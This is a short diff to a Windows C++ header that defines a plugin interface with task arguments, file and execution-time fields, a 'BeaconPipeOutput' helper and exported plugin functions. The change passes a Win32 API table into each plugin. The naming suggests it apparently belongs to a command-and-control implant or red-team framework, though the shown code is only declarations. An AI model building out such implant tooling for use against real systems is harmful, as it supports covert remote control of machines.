@@ -1,5 +1,6 @@
 #pragma once
 #include <Windows.h>
+#include "Win32.h"
 
 #ifndef PLUGIN_CALL
 #define PLUGIN_CALL __stdcall
@@ -16,6 +17,7 @@ typedef struct TaskApi {
     const char* Arguments;     DWORD ArgumentsLen;
     const char* File;          DWORD FileLen;
     const char* ExecTime;      DWORD ExecTimeLen;
+    const WinApiTable* Api;
 } TaskApi;
 
 class IPlugin {
@@ -39,7 +41,7 @@ static void BeaconPipeOutput(HANDLE hRead) {
     }
 }
 
-PLUGIN_EXPORT IPlugin* PLUGIN_CALL create_plugin();
+PLUGIN_EXPORT IPlugin* PLUGIN_CALL create_plugin(const WinApiTable* api);
 PLUGIN_EXPORT void     PLUGIN_CALL destroy_plugin(IPlugin*);
 PLUGIN_EXPORT void     PLUGIN_CALL plugin_init(IPlugin*);
 PLUGIN_EXPORT void     PLUGIN_CALL plugin_exec(TaskApi* task);
